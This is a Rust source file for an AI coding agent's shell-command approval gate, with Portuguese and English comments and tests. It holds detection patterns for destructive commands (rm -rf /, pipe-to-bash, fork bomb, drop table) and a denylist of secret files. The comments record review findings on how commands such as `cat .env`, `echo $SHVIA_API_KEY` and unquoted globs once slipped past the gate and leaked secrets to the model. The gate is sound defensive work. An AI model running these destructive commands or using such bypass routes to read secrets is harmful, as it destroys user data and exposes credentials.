                // classificado junto. `$(rm -rf /)` não pode escapar por ser argumento.
                '`' | '(' | ')' => segs.push(std::mem::take(&mut atual)),
                '$' if it.peek() == Some(&'(') => {
                    it.next();
                    segs.push(std::mem::take(&mut atual));
                }
                c => atual.push(c),
            },
        }
    }
    segs.push(atual);
    segs.into_iter().filter(|s| !s.trim().is_empty()).collect()
}

/// Prefixos que não são o comando de verdade — `sudo rm -rf /` é `rm -rf /`.
///
/// `env` some junto com as atribuições que o precedem (`FOO=1 rm -rf x`), e por isso
/// o laço abaixo também descarta qualquer token no formato `CHAVE=valor` antes do
/// comando: é a forma padrão do shell, e ignorá-la deixaria a guarda cega para ela.
///
/// `xargs` entra porque `cat lista | xargs rm -rf` apaga tudo que estiver na lista, e
/// só o `xargs` aparece na posição de comando.
const PREFIXOS_TRANSPARENTES: &[&str] = &[
    "sudo", "doas", "env", "command", "nohup", "time", "exec", "xargs",
];

/// Opções DESSES prefixos que levam valor num token separado.
///
/// Sem esta lista, `sudo -u root rm -rf /` pararia em `root` como se fosse o comando —
/// a guarda enxergaria um comando inofensivo e deixaria passar. Modelar opção com valor
/// é chato e é o que faz a diferença entre pular o prefixo e pular o alvo.
const OPCOES_COM_VALOR: &[&str] = &[
    "-u", "-g", "-p", "-t", "-c", "-r", "-h", // sudo/doas
    "-n", "-i", "-p", "-d", "-a", "-s", "-e", "-l", "-i{}", // xargs
];

/// O comando e os argumentos de um segmento, sem os prefixos transparentes.
/// `None` quando não sobra comando nenhum (`sudo` sozinho, atribuições só).
fn comando_e_args(seg: &str) -> Option<(String, Vec<String>)> {
    let toks = tokens(seg);
    let mut i = 0;
    while i < toks.len() {
        let t = toks[i].to_lowercase();
        // `CHAVE=valor` antes do comando é atribuição de ambiente, não o comando.
        let atribuicao = t
            .split_once('=')
            .is_some_and(|(k, _)| !k.is_empty() && k.chars().all(|c| c.is_ascii_alphanumeric() || c == '_'));
        if atribuicao {
            i += 1;
            continue;
        }
        if PREFIXOS_TRANSPARENTES.contains(&t.as_str()) {
            i += 1;
            // …e as opções DELE, pulando o valor quando a opção levar um.
            while i < toks.len() && toks[i].starts_with('-') {
                let opc = toks[i].to_lowercase();
                i += 1;
                if OPCOES_COM_VALOR.contains(&opc.as_str()) && i < toks.len() {
                    i += 1;
                }
            }
            continue;
        }
        break;
    }
    let cmd = toks.get(i)?.to_lowercase();
    // Só o nome do executável: `/bin/rm` e `./rm` são `rm`.
    let nome = cmd.rsplit(['/', '\\']).next().unwrap_or(&cmd).to_string();
    Some((nome, toks[i + 1..].to_vec()))
}

/// Alguma flag curta agrupada (`-rf`) ou longa contém a letra/nome procurado?
///
/// `-rf` é UM token com duas flags dentro, e era assim que `rm -r --force build`
/// escapava: a busca por substring procurava a grafia `rm -rf` e não a semântica.
/// Para aqui, `-rf`, `-r -f`, `-fr` e `--recursive --force` são a mesma coisa.
fn tem_flag(args: &[String], curta: char, longas: &[&str]) -> bool {
    args.iter().any(|a| {
        let a = a.to_lowercase();
        if let Some(l) = a.strip_prefix("--") {
            // `--force=x` também conta.
            let nome = l.split('=').next().unwrap_or(l);
            return longas.contains(&nome);
        }
        if let Some(curtas) = a.strip_prefix('-') {
            return !curtas.is_empty() && curtas.chars().all(|c| c.is_ascii_alphanumeric()) && curtas.contains(curta);
        }
        false
    })
}

/// O subcomando do `git`, pulando as opções globais.
///
/// `-C <dir>`, `-c k=v` e `--git-dir <x>` levam VALOR: sem pular o valor junto, o
/// primeiro não-opção encontrado seria o diretório, e `git -C outro push` viraria
/// subcomando `outro`. Era assim que ele escapava para `Confirm`.
fn git_subcomando(args: &[String]) -> Option<(String, &[String])> {
    let mut i = 0;
    while i < args.len() {
        let a = args[i].to_lowercase();
        if matches!(a.as_str(), "-c" | "--git-dir" | "--work-tree" | "--namespace" | "--exec-path") {
            i += 2;
            continue;
        }
        if a.starts_with('-') {
            i += 1;
            continue;
        }
        return Some((a, &args[i + 1..]));
    }
    None
}

/// Padrões que são da LINHA INTEIRA, não de um comando — pipe para shell, fork
/// bomb, SQL destrutivo dentro de um `-c "..."`. Ficam por substring de propósito:
/// aqui a forma textual É o padrão.
fn padrao_de_linha_destrutivo(c: &str) -> bool {
    c.contains("| sh") || c.contains("| bash") || c.contains("|sh") || c.contains("|bash")
        || c.contains("drop table") || c.contains("truncate table")
        || c.contains("drop database")
        || c.contains(":(){")
}

/// Este comando merece `Policy::Always` — perguntar SEMPRE, sem "t/Sempre"?
///
/// ## Por que tokenizado (achado F-05 da revisão de 01/09/2026)
///
/// A versão anterior procurava substrings: `c.contains("rm -rf")`. Isso classifica pela
/// **grafia**, e o shell tem muitas grafias para a mesma coisa. Passavam batido, caindo em
/// `Confirm`: `rm -r --force build`, `git -C outro push`, `sudo rm -rf /`, `FOO=1 rm -rf x`,
/// `/bin/rm -rf x`, `git reset -C x --hard`.
///
/// O dano não é o comando rodar sem ninguém ver — em `Confirm` ele ainda pergunta. É que em
/// `Confirm` o **"t/Sempre" vale**, e é exatamente isso que `Always` existe para impedir.
/// Uma vez que o dev responde "sempre" para um `rm -r --force`, a próxima vez não pergunta.
///
/// ## A decisão de tratar `-r` sozinho como destrutivo
///
/// `rm -r build` sem `-f` some com uma árvore inteira igual. A versão por substring exigia a
/// dupla porque procurava a grafia `rm -rf`; classificar por semântica torna a pergunta
/// "isto apaga recursivamente?", e a resposta não depende do `-f`. O custo de errar para o
/// lado estrito é **uma confirmação a mais**; para o outro lado, é uma árvore apagada com
/// "sempre" memorizado.
fn is_destructive(cmd: &str) -> bool {
    let baixo = cmd.to_lowercase();
    if padrao_de_linha_destrutivo(&baixo) {
        return true;
    }
    segmentos_de_comando(cmd).iter().any(|seg| segmento_destrutivo(seg))
}

fn segmento_destrutivo(seg: &str) -> bool {
    let Some((cmd, args)) = comando_e_args(seg) else {
        return false;
    };
    match cmd.as_str() {
        // Recursivo é o gatilho, com ou sem `--force` (ver o docblock acima).
        "rm" => tem_flag(&args, 'r', &["recursive", "dir"]),
        // Formatar disco: qualquer `mkfs`, inclusive `mkfs.ext4`.
        c if c.starts_with("mkfs") => true,
        "dd" => true,
        "chmod" => tem_flag(&args, 'r', &["recursive"]) && args.iter().any(|a| a.contains("777")),
        "git" => match git_subcomando(&args) {
            Some((sub, resto)) => match sub.as_str() {
                "push" => true,
                "reset" => resto.iter().any(|a| a.eq_ignore_ascii_case("--hard")),
                // `git clean` sem `-f` não apaga nada (o próprio git recusa), então a
                // força é o gatilho — e cobre `-fd`, `-df`, `-f -d` e `--force` de uma vez.
                "clean" => tem_flag(resto, 'f', &["force"]),
                // ⚠️ `git branch -D` NÃO entra: o achado lista push/reset --hard/clean, a
                // casa já o testa como `Confirm`, e branch local apagada volta pelo reflog.
                _ => false,
            },
            None => false,
        },
        // ⚠️ `find … -delete`, `shred`, `chown -R`, `mkswap` NÃO entram aqui, e a
        // ausência é decisão, não esquecimento. Este achado (F-05) pede para trocar a
        // classificação por SUBSTRING por classificação por TOKEN — não para ampliar o
        // conjunto do que é destrutivo. `find -delete` já é `Confirm` por decisão
        // registrada da casa (`find_so_e_leitura_enquanto_nao_escreve`), e promovê-lo
        // aqui seria mudar comportamento decidido a reboque de outro conserto.
        // Fica anotado na revisão como pergunta ao dono, não como mudança minha.
        _ => false,
    }
}

/// Comandos de LEITURA que rodam sem perguntar (regra do produto: "leitura = auto").
///
/// Cresceu em 19/08 depois de um relato concreto: o gate pedia aprovação para
/// quase toda inspeção, e a maioria era `grep`, `sed -n`, `find` — ferramentas de
/// leitura que simplesmente não estavam aqui. Gate que pergunta demais treina o
/// dev a aprovar sem ler, que é o oposto do que ele existe para fazer.
///
/// Entra aqui o que **não escreve, não apaga e não sai para a rede**. `curl`,
/// `wget`, `ssh`, `docker` e afins ficam de fora de propósito.
const ALLOWLIST: &[&str] = &[
    // Navegação e leitura de arquivo
    "ls", "cat", "pwd", "echo", "head", "tail", "wc", "file", "cd", "stat",
    "tree", "du", "df", "basename", "dirname", "realpath", "readlink",
    // Busca e filtro (o grosso do que faltava)
    "grep", "egrep", "fgrep", "rg", "ag", "cut", "sort", "uniq", "nl",
    "diff", "jq", "column", "tr", "which", "type", "command -v",
    // Git só-leitura
    "git status", "git diff", "git log", "git show", "git branch",
    "git rev-parse", "git ls-files", "git blame", "git describe",
    "git remote -v", "git stash list", "git worktree list", "git config --get",
    // Build/teste (já rodavam)
    "composer test", "npm test", "npm run", "cargo check", "cargo clippy",
    "cargo test", "cargo build", "php -l", "phpunit", "pytest", "make test",
];

/// `find` é leitura **até deixar de ser**: `-delete` apaga, `-exec`/`-ok` executam
/// comando arbitrário e `-fprint*`/`-fls` gravam arquivo. Por isso não entra na
/// lista de prefixo — entra com guarda, e na dúvida cai para `Confirm`.
///
/// **`sed` ficou DE FORA de propósito**, e vale registrar por quê: `sed -n` é
/// leitura, mas `sed -n 's/a/b/w saida'` grava — o `w` é um comando do script, e
/// distingui-lo de um `w` que só faz parte de um padrão (`/warn/p`) exige parsear
/// sed de verdade. A opção era uma guarda que ou deixa passar escrita, ou reprova
/// `/warn/p` e volta a encher o dev de pergunta. Guarda incompleta em gate de
/// segurança é pior que ausência de guarda, então `sed` continua pedindo
/// aprovação.
///
/// 🔴 **E o `awk` SAIU do `Auto` em 02/09/2026, pelo MESMO critério** (achado F-03). Ele
/// estava aqui como a alternativa sem ambiguidade ao `sed` — e não é: `system("…")` executa
/// comando, `print > "arquivo"` grava, `| "cmd"` pipa, tudo **dentro do programa**, que é
/// texto entre aspas e portanto invisível para o scanner de metacaractere. Distinguir
/// `print > "f"` de `NR >= 37` é exatamente a ambiguidade do `w` do sed — e esta casa já
/// tropeçou nela: o comentário do `dividir_por_and` registra o dia em que um `contains('>')`
/// ingênuo recusou `awk 'NR>=37 && NR<=46'`. Uma guarda parcial aqui erraria dos dois lados.
///
/// O que se perde: uma confirmação por `awk`. O que fica em `Auto` para ler intervalo e
/// coluna: `head`, `tail`, `nl`, `cut`, `grep -n`.
///
/// **`npm run <script>`, `cargo build/test` e `make test` continuam em `Auto`, e isso é uma
/// DECISÃO, não um esquecimento:** eles executam o que está declarado no projeto que o dev
/// abriu (`package.json`, `Cargo.toml`, `Makefile`). Um prompt injetado não muda esses
/// arquivos sem passar por `write_file`/`edit_file`, que têm cartão. Em uma frase: **o dev
/// confia no `package.json` do próprio projeto.** Quem não quiser esse contrato tira as
/// quatro entradas desta lista — é uma linha, e o efeito é uma confirmação por build.
fn leitura_condicional(seg: &str) -> Option<bool> {
    let c = seg.trim();
    if c == "find" || c.starts_with("find ") {
        let mau = c.contains("-delete") || c.contains("-exec") || c.contains("-ok")
            || c.contains("-fprint") || c.contains("-fls");
        return Some(!mau);
    }
    // `git branch` era prefixo, e prefixo não distingue LER de APAGAR: `git branch -D main`
    // saía em `Auto`. Só as formas de leitura seguem automáticas (achado F-03).
    if c == "git branch" || c.starts_with("git branch ") {
        const LEITURA: &[&str] = &[
            "-a", "--all", "-r", "--remotes", "-v", "-vv", "--verbose", "-l", "--list",
            "--show-current", "--merged", "--no-merged", "--contains", "--no-contains",
            "--sort", "--format", "-i", "--color", "--no-color",
        ];
        return Some(tokens(c).into_iter().skip(2).all(|t| {
            let chave = t.split('=').next().unwrap_or("").to_string();
            // Nome de branch como argumento de `--merged`/`--contains` é leitura; o que
            // decide é não haver flag de escrita. Só flags são conferidas.
            !chave.starts_with('-') || LEITURA.contains(&chave.as_str())
        }));
    }
    // `sort -o saida` e `uniq entrada saida` ESCREVEM — os dois estavam em `Auto` pelo
    // nome, e o nome não diz que o segundo posicional é destino.
    if c == "sort" || c.starts_with("sort ") {
        return Some(!tokens(c).iter().skip(1).any(|t| t == "-o" || t.starts_with("--output")));
    }
    if c == "uniq" || c.starts_with("uniq ") {
        let posicionais = tokens(c).into_iter().skip(1).filter(|t| !t.starts_with('-')).count();
        return Some(posicionais <= 1);
    }
    None
}

/// Varre o comando **com consciência de aspas** e devolve os segmentos separados
/// por `&&`, ou `None` se encontrar qualquer metacaractere que o gate recusa.
///
/// Duas correções que a versão ingênua (um `contains`/`replace` na string crua)
/// não tinha, e as duas apareceram no mesmo comando real —
/// `awk 'NR>=37 && NR<=46' x`:
///
///  1. o `&&` estava DENTRO do script e virava dois pedaços sem sentido;
///  2. o `>=` fazia o `contains('>')` recusar o comando como se houvesse
///     redirecionamento.
///
/// Os dois erram para o lado seguro (perguntar a mais), mas era exatamente o
/// `awk` que existe aqui como alternativa ao `sed` — então o conserto é no
/// scanner, não nos testes.
///
/// **Aspas simples e duplas NÃO são equivalentes**, e a diferença é de segurança:
/// dentro de `'…'` tudo é literal; dentro de `"…"` o shell ainda expande
/// `$(…)` e crase. Por isso substituição de comando é recusada mesmo entre aspas
/// duplas.
fn dividir_por_and(cmd: &str) -> Option<Vec<String>> {
    let mut segs = Vec::new();
    let mut atual = String::new();
    let mut aspa: Option<char> = None;
    let mut it = cmd.chars().peekable();

    while let Some(ch) = it.next() {
        // The token checks do not interpret shell escapes: `.e\nv` becomes `.env` only
        // when sh runs it. Ask rather than approve a different argument automatically.
        // A backslash inside plain single quotes is literal; $'...' instead decodes escapes.
        if aspa != Some('\'') && (ch == '\\' || (ch == '$' && it.peek() == Some(&'\''))) {
            return None;
        }
        // Substituição de comando expande em tudo que não seja aspa simples.
        if aspa != Some('\'') && (ch == '`' || (ch == '$' && it.peek() == Some(&'('))) {
            return None;
        }
        match aspa {
            // Dentro de aspas: só a aspa de fechamento tem significado.
            Some(a) => {
                if ch == a {
                    aspa = None;
                }
                atual.push(ch);
            }
            None => match ch {
                '\'' | '"' => { aspa = Some(ch); atual.push(ch); }
                '>' | '<' | '|' | ';' => return None, // redireciona, encadeia ou pipa
                '&' => {
                    if it.peek() == Some(&'&') {
                        it.next();
                        segs.push(std::mem::take(&mut atual));
                    } else {
                        return None; // `&` de background
                    }
                }
                c => atual.push(c),
            },
        }
    }
    // Aspa aberta e não fechada: não dá para afirmar o que o shell faria.
    if aspa.is_some() {
        return None;
    }
    segs.push(atual);
    Some(segs)
}

/// Tokens do segmento, com as aspas resolvidas — `cat '.env'` e `cat ".env"` dão o mesmo
/// token que `cat .env`. Escapar de aspas era o caminho mais óbvio para driblar a guarda
/// de argumento abaixo, e por isso ela não olha a string crua.
fn tokens(seg: &str) -> Vec<String> {
    let mut out = Vec::new();
    let mut atual = String::new();
    let mut aspa: Option<char> = None;
    let mut tem = false;
    for ch in seg.chars() {
        match aspa {
            Some(a) => {
                if ch == a {
                    aspa = None;
                } else {
                    atual.push(ch);
                }
            }
            None => match ch {
                '\'' | '"' => {
                    aspa = Some(ch);
                    tem = true;
                }
                c if c.is_whitespace() => {
                    if tem || !atual.is_empty() {
                        out.push(std::mem::take(&mut atual));
                        tem = false;
                    }
                }
                c => atual.push(c),
            },
        }
    }
    if tem || !atual.is_empty() {
        out.push(atual);
    }
    out
}

/// `..` que sai da raiz, lexicamente (sem tocar no disco: o caminho pode não existir, e
/// perguntar ao FS aqui faria um `ls pasta-que-vou-criar` pedir aprovação sem motivo).
fn escapa_da_raiz(tok: &str) -> bool {
    let mut prof: i32 = 0;
    for parte in tok.split('/') {
        match parte {
            "" | "." => {}
            ".." => {
                prof -= 1;
                if prof < 0 {
                    return true;
                }
            }
            _ => prof += 1,
        }
    }
    false
}

/// 🔴 O argumento é um caminho que este gate NÃO consegue dar por seguro?
///
/// **Achado F-02 da revisão de 01/09/2026, e ele é o defeito que mais doeu ler:** a
/// `ALLOWLIST` era conferida só pelo **prefixo** do comando, e nunca pelos argumentos. O
/// `read_file` recusa `.env` pela `guard::denied` desde sempre — e `cat .env` saía em
/// `Policy::Auto`, sem cartão nenhum. A mesma trava que a tool de leitura respeita era
/// contornável pelo `bash` ao lado dela, com o mesmo modelo escolhendo o caminho.
///
/// O que ela recusa (rebaixando o segmento para `Confirm`, não bloqueando):
///
///  - qualquer token na **denylist de segredos** (`guard::denied`): `.env`, `*.pem`, `id_rsa*`,
///    `credentials`, `/.ssh/`, `/.aws/`, `.git/` — a mesma lista das tools de arquivo;
///  - caminho **absoluto** (`/etc/...`) ou de **home** (`~/...`): fora da raiz do projeto;
///  - `..` que **escapa** da raiz;
///  - **qualquer token com expansão de variável** (`$HOME/x`, `"$dir/y"`, `$SHVIA_API_KEY`):
///    o valor só existe na hora, então não há o que conferir.
///
///    🔴 **Mudou em 21/09/2026, e a versão anterior desta linha dizia o oposto.** Ela dizia que
///    `grep "$padrao" arquivo` *"continua passando — o token do padrão não parece caminho"*, e
///    era verdade: a checagem de `$` ficava ATRÁS do portão `if !parece_caminho { continue; }`.
///    O caso que o autor tinha em mente era um padrão de busca. O caso que ninguém enumerou era
///    `echo $SHVIA_API_KEY`: `echo` está na ALLOWLIST, `$SHVIA_API_KEY` não tem `~`, `.` nem
///    `/`, então o `continue` disparava, a checagem nunca rodava, e a chave da instalação voltava
///    ao modelo em `Policy::Auto` — sem cartão.
///
///    ⚠️ **O preço está pago de propósito:** `grep "$padrao" arquivo` passa a pedir aprovação.
///    Uma variável que vira argumento é exatamente o que um cartão existe para mostrar, e a
///    alternativa — decidir pelo NOME da variável — falha aberta na primeira que ninguém listou.
///
/// **O que ela NÃO fecha, e fica escrito em vez de mascarado:** busca recursiva
/// (`grep -r X .`, `rg X`) segue em `Auto` e pode imprimir uma linha de dentro de um `.env`
/// que esteja no projeto. Fechar isso exigiria decidir por conteúdo, não por caminho — é
/// outra guarda, com outro custo, e prometer que esta cobre aquilo seria a mentira que o
/// comentário do `sed` logo acima existe para não repetir.
fn argumento_de_caminho_recusado(seg: &str) -> Option<String> {
    for tok in tokens(seg).into_iter().skip(1) {
        if tok.starts_with('-') {
            continue; // flag, não caminho
        }
        let parece_caminho = tok.starts_with('~') || tok.starts_with('.') || tok.contains('/');
        if crate::guard::denied(&tok) {
            return Some(tok);
        }
        if !parece_caminho {
            continue; // padrão, glob, nome de script — não é caminho
        }
        if tok.starts_with('/') || tok.starts_with('~') || escapa_da_raiz(&tok) {
            return Some(tok);
        }
    }
    None
}

/// Expansão de variável (`$VAR`, `${VAR}`) **fora de aspa simples**.
///
/// 🔴 Medido em 21/09/2026: `echo $SHVIA_API_KEY` era `Policy::Auto`. A checagem de `$` vivia
/// dentro de `argumento_de_caminho_recusado`, atrás do portão `if !parece_caminho { continue; }`
/// — e `$SHVIA_API_KEY` não tem `~`, `.` nem `/`. O `continue` disparava primeiro, a checagem
/// nunca rodava, e a chave da instalação voltava ao modelo sem cartão nenhum.
///
/// ⚠️ **A regra de aspa é a MESMA do `dividir_por_and`**, e isso não é coincidência: ali
/// `$(…)` e crase já são recusados com `aspa != Some('\'')`, porque o shell expande os dois em
/// tudo que não seja aspa simples. Uma variável obedece à mesma regra, e conferi-la no segmento
/// CRU — com as aspas ainda de pé — é o que permite distinguir `echo '$(whoami)'` (literal,
/// segue `Auto`) de `echo "$HOME"` (expande, pede cartão). O `tokens()` não serve aqui: ele
/// resolve as aspas de propósito e perde justamente essa informação.
///
/// ⚠️ **O preço, declarado:** `grep "$padrao" arquivo` passa a pedir aprovação. Uma variável que
/// vira argumento é exatamente o que um cartão existe para mostrar, e a alternativa — decidir
/// pelo NOME da variável — falha aberta na primeira que ninguém listou.
fn expansao_de_variavel(seg: &str) -> Option<String> {
    let mut aspa: Option<char> = None;
    let mut it = seg.chars().peekable();

    while let Some(ch) = it.next() {
        match aspa {
            Some(a) => {
                if ch == a {
                    aspa = None;
                }
                // Dentro de aspa SIMPLES o `$` é literal; dentro da dupla, não.
                if a == '"' && ch == '$' {
                    if let Some(&p) = it.peek() {
                        if p.is_ascii_alphanumeric() || p == '_' || p == '{' {
                            return Some(seg.to_string());
                        }
                    }
                }
            }
            None => match ch {
                '\'' | '"' => aspa = Some(ch),
                '$' => {
                    if let Some(&p) = it.peek() {
                        if p.is_ascii_alphanumeric() || p == '_' || p == '{' {
                            return Some(seg.to_string());
                        }
                    }
                }
                _ => {}
            },
        }
    }
    None
}

/// An argument the SHELL expands into file names (`*`, `?`, `[`, or a `{a,b}` brace list) outside
/// quotes — so this gate never sees the files the command will open.
///
/// 🔴 Measured on 26/10/2026 (external review): `argumento_de_caminho_recusado` checks each token
/// literally, and `cat .e*`, `cat certs/*` and `head -n 50 .e*` were `Policy::Auto` — the shell
/// expanded them to `.env` and `certs/server.pem` after the check, and the contents went to the
/// model with no card. Expanding the glob here would mean re-implementing the shell's rules (hidden
/// files, `cd` earlier in the line, `nullglob`), and a partial copy would fail open; a card is the
/// honest answer.
///
/// Flags are skipped (`--include=*.rs` is never expanded in practice), and so is a pattern inside
/// quotes (`grep -n "fn .*x" src`), which is what the agent writes. The price: `grep TODO src/*.rs`
/// now asks; `grep -rn TODO src/` does not.
fn glob_sem_aspas(seg: &str) -> Option<String> {
    let mut aspa: Option<char> = None;
    let mut palavra = String::new();
    let mut glob = false;
    let mut chave = false;
    let mut primeira = true;
    let fecha = |palavra: &mut String, glob: &mut bool, chave: &mut bool, primeira: &mut bool| {
        let achou = !*primeira && (*glob || (*chave && palavra.contains(','))) && !palavra.starts_with('-');
        let out = achou.then(|| palavra.clone());
        if !palavra.is_empty() {
            *primeira = false;
        }
        palavra.clear();
        *glob = false;
        *chave = false;
        out
    };
    for ch in seg.chars() {
        match aspa {
            Some(a) => {
                if ch == a {
                    aspa = None;
                }
                palavra.push(ch);
            }
            None => match ch {
                '\'' | '"' => {
                    aspa = Some(ch);
                    palavra.push(ch);
                }
                c if c.is_whitespace() => {
                    if let Some(w) = fecha(&mut palavra, &mut glob, &mut chave, &mut primeira) {
                        return Some(w);
                    }
                }
                '*' | '?' | '[' => {
                    glob = true;
                    palavra.push(ch);
                }
                '{' => {
                    chave = true;
                    palavra.push(ch);
                }
                _ => palavra.push(ch),
            },
        }
    }
    fecha(&mut palavra, &mut glob, &mut chave, &mut primeira)
}

/// Commands that print names or metadata, never contents: a glob in their arguments shows the model
/// nothing it could not list anyway, so they keep `Auto`.
fn so_lista_nomes(seg: &str) -> bool {
    const NOMES: &[&str] = &["ls", "wc", "file", "stat", "du", "tree", "basename", "dirname", "realpath", "readlink"];
    let c = seg.trim();
    NOMES.iter().any(|n| c == *n || c.starts_with(&format!("{n} ")))
        || c.starts_with("git ls-files")
        || c.starts_with("git status")
}

fn segmento_permitido(seg: &str) -> bool {
    let c = seg.trim();
    if c.is_empty() {
        return false;
    }
    // Antes da lista: nenhum comando de leitura é `Auto` se o ARGUMENTO não for defensável.
    if argumento_de_caminho_recusado(c).is_some() {
        return false;
    }
    if expansao_de_variavel(c).is_some() {
        return false;
    }
    if glob_sem_aspas(c).is_some() && !so_lista_nomes(c) {
        return false;
    }
    if let Some(ok) = leitura_condicional(c) {
        return ok;
    }
    ALLOWLIST.iter().any(|pfx| c == *pfx || c.starts_with(&format!("{pfx} ")))
}

/// Público no crate porque o gate determinístico do orquestrador só roda o que
/// o `bash` já aprovaria sozinho (`Policy::Auto`) — o gate não pode virar porta
/// dos fundos pra executar comando sem o dev ver.
pub(crate) fn is_simple_allowlisted(cmd: &str) -> bool {
    let c = cmd.trim();

    // Metacaracteres que redirecionam, substituem ou rodam em paralelo derrubam o
    // comando inteiro: escondem efeito que a leitura do segmento não revela. A
    // checagem é feita pelo scanner, que sabe o que está entre aspas.
    //
    // `&&` é a EXCEÇÃO, e é ela que devolve o silêncio ao gate. O agente compõe
    // `cd <pasta> && grep ...` o tempo todo; antes disto, um encadeamento de dois
    // comandos de leitura pedia aprovação porque a string tinha "&&" — e o dev
    // aprovava `cd X && ls` vinte vezes por sessão. Cada segmento é conferido
    // isoladamente e TODOS têm de passar; basta um fora da lista para virar
    // `Confirm`. O `is_destructive` já rodou sobre a string INTEIRA antes daqui.
    // (`||` cai no `|` dentro do scanner.)
    match dividir_por_and(c) {
        None => false, // `&` fora de aspas que não é `&&` = background
        Some(segs) => segs.iter().all(|s| segmento_permitido(s)),
    }
}

fn cap(s: &str, max: usize) -> String {
    if s.len() <= max {
        s.to_string()
    } else {
        format!("{}\n… [saída cortada em {max} bytes]", &s[..max])
    }
}

// ── Git (C2) ────────────────────────────────────────────────────────────────

fn run_git(root: &Path, args: &[&str]) -> String {
    match Command::new("git").args(args).current_dir(root).output() {
        Ok(o) => {
            let out = String::from_utf8_lossy(&o.stdout);
            let err = String::from_utf8_lossy(&o.stderr);
            let combined = if err.trim().is_empty() { out.into_owned() } else { format!("{out}{err}") };
            let combined = combined.trim();
            if combined.is_empty() { "(sem saída)".into() } else { cap(combined, MAX_OUTPUT) }
        }
        Err(e) => format!("ERRO: git falhou ({e}). Está num repositório git?"),
    }
}

fn git_commit(root: &Path, message: &str, add_all: bool, id: &str, fe: &mut dyn Frontend) -> String {
    if message.trim().is_empty() {
        return "ERRO: mensagem de commit vazia.".into();
    }
    if add_all {
        let _ = run_git(root, &["add", "-A"]);
    }
    let staged = run_git(root, &["diff", "--staged", "--stat"]);
    if staged.starts_with("ERRO") {
        return staged;
    }
    if staged == "(sem saída)" {
        return "ERRO: nada staged pra commitar (use add_all=true ou faça git add antes).".into();
    }
    let preview = Preview::Commit { stat: staged.as_str(), message };
    if !fe.approve(Policy::Confirm, "git_commit", id, &preview) {
        return "RECUSADO: commit cancelado pelo usuário.".into();
    }
    run_git(root, &["commit", "-m", message])
}

#[cfg(test)]
mod tests {
    // ── todo_write (0.13.0): the task list ShvIA's Tasks tab shows ───────────────────────────

    #[test]
    fn todo_write_is_offered_and_answers_with_a_summary() {
        assert!(defs().iter().any(|d| d.name == "todo_write"), "the model has to be offered the tool");
        let r = todo_write(&serde_json::json!({"todos": [
            {"content": "Map the module", "status": "completed"},
            {"content": "Fix the queries", "status": "in_progress", "activeForm": "Fixing the queries"},
            {"content": "Write the report", "status": "pending"}
        ]}));
        assert_eq!(r, "Lista de tarefas atualizada: 1 de 3 concluídas. Em andamento: Fix the queries.");
    }

    #[test]
    fn todo_write_refuses_what_the_screen_could_not_show() {
        assert!(todo_write(&serde_json::json!({})).starts_with("ERRO"), "no list");
        assert!(todo_write(&serde_json::json!({"todos": [{"content": "", "status": "pending"}]})).starts_with("ERRO"));
        assert!(todo_write(&serde_json::json!({"todos": [{"content": "x", "status": "doing"}]})).contains("doing"));
        let muitas: Vec<_> = (0..51).map(|i| serde_json::json!({"content": format!("t{i}"), "status": "pending"})).collect();
        assert!(todo_write(&serde_json::json!({"todos": muitas})).starts_with("ERRO"));
    }

    #[test]
    fn todo_write_warns_when_more_than_one_task_is_in_progress() {
        let r = todo_write(&serde_json::json!({"todos": [
            {"content": "a", "status": "in_progress"}, {"content": "b", "status": "in_progress"}
        ]}));
        assert!(r.contains("uma por vez"), "{r}");
    }


    // ── F-04: teto de tempo do bash ─────────────────────────────────────────

    #[test]
    fn comando_rapido_passa_inteiro_pelo_teto() {
        let dir = sandbox();
        let out = executar_bash(&dir, "echo ola", Some(Duration::from_secs(10)));
        assert!(out.contains("ola"), "saída: {out}");
        assert!(out.contains("[exit 0]"), "saída: {out}");
        assert!(!out.contains("timeout"), "saída: {out}");
    }

    #[test]
    fn comando_que_trava_e_morto_no_teto() {
        let dir = sandbox();
        let t0 = Instant::now();
        let out = executar_bash(&dir, "sleep 30", Some(Duration::from_millis(300)));
        let gasto = t0.elapsed();
        assert!(out.contains("timeout de 0s") || out.contains("ERRO: timeout"), "saída: {out}");
        // O ponto é ele VOLTAR. Antes deste conserto esta linha nunca retornava.
        assert!(gasto < Duration::from_secs(5), "demorou {gasto:?} — o teto não cortou");
    }

    #[test]
    fn o_neto_morre_junto_com_o_pai() {
        // 🔴 A prova que separa "matei o `sh`" de "matei a árvore". O `sh -c` sobe um
        // filho que dorme e sai de cena; matar só o `sh` deixaria o neto vivo segurando
        // o pipe — e a leitura da saída ficaria pendurada exatamente como antes.
        let dir = sandbox();
        let marca = dir.join("neto.pid");
        // Forward slashes and double quotes: on Windows `display()` gives `C:\Users\...`,
        // and the inner `sh` would read those backslashes as escapes and write the PID
        // somewhere else. Git for Windows' `sh` accepts `C:/...`.
        let caminho = marca.display().to_string().replace('\\', "/");
        let cmd = format!("sh -c 'echo $$ > \"{caminho}\"; sleep 30' & wait");
        // The ceiling has to outlast the grandchild's birth. Git for Windows' `sh` forks
        // slowly enough that at 500 ms the Job Object (0.11.33) killed the tree before the
        // grandchild had written its PID, and the test had nothing to measure.
        let teto = Duration::from_millis(if cfg!(windows) { 3000 } else { 500 });
        let t0 = Instant::now();
        let out = executar_bash(&dir, &cmd, Some(teto));
        assert!(out.contains("ERRO: timeout"), "saída: {out}");
        assert!(t0.elapsed() < teto + Duration::from_secs(5), "não voltou a tempo");

        // O neto tem de estar morto. `kill -0` responde se o processo existe.
        let pid = std::fs::read_to_string(&marca).unwrap_or_default().trim().to_string();
        assert!(!pid.is_empty(), "o neto nem chegou a nascer — o teste não mede nada");
        std::thread::sleep(Duration::from_millis(200));
        // `sh`'s builtin `kill`, not a `kill` binary: the PID is the one `sh` printed (on
        // Windows an MSYS PID, which only that runtime resolves), and a binary missing from
        // PATH made `unwrap_or(false)` read "could not run" as "dead", a pass that measured
        // nothing. A shell that cannot run fails the test instead.
        let status = Command::new("sh")
            .arg("-c")
            .arg(format!("kill -0 {pid}"))
            .stdout(Stdio::null())
            .stderr(Stdio::null())
            .status()
            .expect("sh para conferir o neto");
        assert!(!status.success(), "o neto {pid} sobreviveu — o kill não alcançou o grupo");
    }

    #[test]
    fn saida_grande_nao_trava_o_pipe() {
        // Sem as threads de leitura, um comando que escreve mais que o buffer do pipe
        // (64 KB no Linux) bloqueia na escrita e o teto o mataria como se estivesse
        // travado — "consertando" um processo saudável.
        let dir = sandbox();
        let out = executar_bash(&dir, "yes abcdefgh | head -c 300000", Some(Duration::from_secs(20)));
        assert!(!out.contains("ERRO: timeout"), "matou um comando que só era falante");
